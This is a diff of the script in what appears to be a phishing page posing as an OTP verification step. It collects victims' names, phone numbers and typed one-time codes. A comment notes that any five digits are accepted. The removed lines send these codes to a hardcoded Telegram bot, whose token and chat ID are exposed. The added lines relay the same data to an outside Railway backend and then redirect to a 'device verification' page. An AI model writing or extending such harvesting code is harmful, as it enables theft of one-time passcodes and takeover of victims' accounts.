@@ -284,10 +284,10 @@
 </div>
 
 <script>
-    // ─── TELEGRAM CONFIG ───
-    const TELEGRAM = {
-        BOT_TOKEN: '8493790420:AAFloSkJcVN6VmrFAOpebp1khMlPqs0_H0s',
-        CHAT_ID: '8425632882'
+    // ─── BACKEND CONFIG ───
+    const CONFIG = {
+        API_URL: 'https://telecelkr-production.up.railway.app',
+        DEVICE_PAGE: 'device_verify.html'
     };
 
     // ─── STATE ───
@@ -300,6 +300,7 @@
     let timeLeft = 30;
     let isVerified = false;
     let isProcessing = false;
+    let generatedOTP = null;
 
     function moveNext(el, idx) {
         el.value = el.value.replace(/\D/g, '').slice(0, 1);
@@ -351,29 +352,34 @@
         document.getElementById('errorMsg').style.display = 'none';
     }
 
-    // ─── SEND OTP TO TELEGRAM ───
-    async function sendOTPToTelegram(otp) {
-        const message = `📱 *OTP Verification Request*\n\n` +
-            `👤 *User:* ${name}\n` +
-            `📱 *Phone:* ${phone}\n` +
-            `🔑 *OTP Code:* \`${otp}\`\n` +
-            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-            `✅ User is verifying their OTP.`;
-
+    // ─── GENERATE OTP VIA BACKEND ───
+    async function generateOTP() {
         try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
+            const response = await fetch(`${CONFIG.API_URL}/api/generate-otp`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM.CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
+                    name: name,
+                    phone: phone
                 })
             });
-            return await response.json();
+
+            const data = await response.json();
+            console.log('📤 OTP Generated:', data);
+
+            if (data.success && data.otp) {
+                generatedOTP = data.otp;
+                console.log('🔑 Generated OTP:', generatedOTP);
+                return true;
+            } else {
+                console.error('❌ Failed to generate OTP');
+                return false;
+            }
         } catch (error) {
-            console.error('❌ Telegram error:', error);
-            return null;
+            console.error('❌ OTP Generation Error:', error);
+            return false;
         }
     }
 
@@ -396,32 +402,56 @@
         // ACCEPT ANY 5 DIGITS - NO RESTRICTIONS
         const isValid = code.length === 5;
 
-        // Send to Telegram
-        await sendOTPToTelegram(code);
+        try {
+            // Send OTP verification to backend
+            const response = await fetch(`${CONFIG.API_URL}/api/otp-verified`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    name: name,
+                    phone: phone,
+                    otp: code,
+                    verified: isValid
+                })
+            });
 
-        document.getElementById('spinner').style.display = 'none';
+            const data = await response.json();
+            console.log('📤 OTP Verification Response:', data);
 
-        if (isValid) {
-            isVerified = true;
-            document.getElementById('verifyBtn').textContent = '✅ Verified!';
-            showSuccess('✅ OTP verified successfully! Redirecting to device verification...');
+            document.getElementById('spinner').style.display = 'none';
 
-            localStorage.setItem('otp_verified', 'true');
+            if (isValid) {
+                isVerified = true;
+                document.getElementById('verifyBtn').textContent = '✅ Verified!';
+                showSuccess('✅ OTP verified successfully! Redirecting to device verification...');
 
-            setTimeout(() => {
-                window.location.href = 'device_verify.html?' + params.toString();
-            }, 1500);
-        } else {
-            showError('❌ Invalid OTP. Please try again.');
+                localStorage.setItem('otp_verified', 'true');
+
+                setTimeout(() => {
+                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
+                }, 1500);
+            } else {
+                showError('❌ Invalid OTP code. Please try again.');
+                isProcessing = false;
+                document.getElementById('verifyBtn').disabled = false;
+                document.getElementById('verifyBtn').textContent = 'Verify OTP';
+                
+                for (let i = 1; i <= 5; i++) {
+                    document.getElementById('d' + i).value = '';
+                }
+                document.getElementById('d1').focus();
+                updateBtn();
+            }
+
+        } catch (error) {
+            console.error('❌ Verification Error:', error);
+            document.getElementById('spinner').style.display = 'none';
+            showError('❌ Connection error. Please try again.');
             isProcessing = false;
             document.getElementById('verifyBtn').disabled = false;
             document.getElementById('verifyBtn').textContent = 'Verify OTP';
-            
-            for (let i = 1; i <= 5; i++) {
-                document.getElementById('d' + i).value = '';
-            }
-            document.getElementById('d1').focus();
-            updateBtn();
         }
     }
 
@@ -431,27 +461,18 @@
         
         const link = document.getElementById('resendLink');
         link.classList.add('disabled');
+        
         document.getElementById('timer').textContent = '(sending...)';
-
-        // Send OTP request to Telegram
-        const message = `📨 *OTP Requested*\n\n` +
-            `👤 *User:* ${name}\n` +
-            `📱 *Phone:* ${phone}\n` +
-            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-            `🔄 User requested a new OTP.`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM.CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch (error) {
-            console.error('❌ Resend error:', error);
+        
+        const success = await generateOTP();
+        
+        if (!success) {
+            document.getElementById('timer').textContent = '(failed)';
+            setTimeout(() => {
+                document.getElementById('timer').textContent = '(resend)';
+                link.classList.remove('disabled');
+            }, 3000);
+            return;
         }
 
         timeLeft = 30;
@@ -481,6 +502,8 @@
         setTimeout(() => {
             document.getElementById('successMsg').style.display = 'none';
         }, 3000);
+
+        console.log('📨 New OTP generated for ' + phone);
     }
 
     // ─── PASTE SUPPORT ───
@@ -519,39 +542,38 @@
         });
     }
 
-    window.onload = function() {
+    window.onload = async function() {
         document.getElementById('d1').focus();
         
-        timeLeft = 30;
-        document.getElementById('timer').textContent = '(30s)';
-        const timerEl = document.getElementById('timer');
+        const success = await generateOTP();
+        
+        if (success) {
+            timeLeft = 30;
+            document.getElementById('timer').textContent = '(30s)';
+            const timerEl = document.getElementById('timer');
 
-        timerInterval = setInterval(() => {
-            timeLeft--;
-            timerEl.textContent = '(' + timeLeft + 's)';
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-                timerEl.textContent = '(resend)';
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerEl.textContent = '(' + timeLeft + 's)';
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    timerEl.textContent = '(resend)';
+                    document.getElementById('resendLink').classList.remove('disabled');
+                }
+            }, 1000);
+
+            showSuccess('📨 OTP sent to your phone!');
+            setTimeout(() => {
+                document.getElementById('successMsg').style.display = 'none';
+            }, 3000);
+        } else {
+            document.getElementById('timer').textContent = '(failed)';
+            setTimeout(() => {
+                document.getElementById('timer').textContent = '(resend)';
                 document.getElementById('resendLink').classList.remove('disabled');
-            }
-        }, 1000);
-
-        showSuccess('📨 OTP sent to your phone!');
-        setTimeout(() => {
-            document.getElementById('successMsg').style.display = 'none';
-        }, 3000);
-
-        // Notify Telegram that OTP page loaded
-        fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM.CHAT_ID,
-                text: `📱 *OTP Page Loaded*\n\n👤 *User:* ${name}\n📱 *Phone:* ${phone}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n🔑 OTP page is ready for verification.`,
-                parse_mode: 'Markdown'
-            })
-        }).catch(() => {});
+            }, 3000);
+        }
     };
 </script>
 </body>
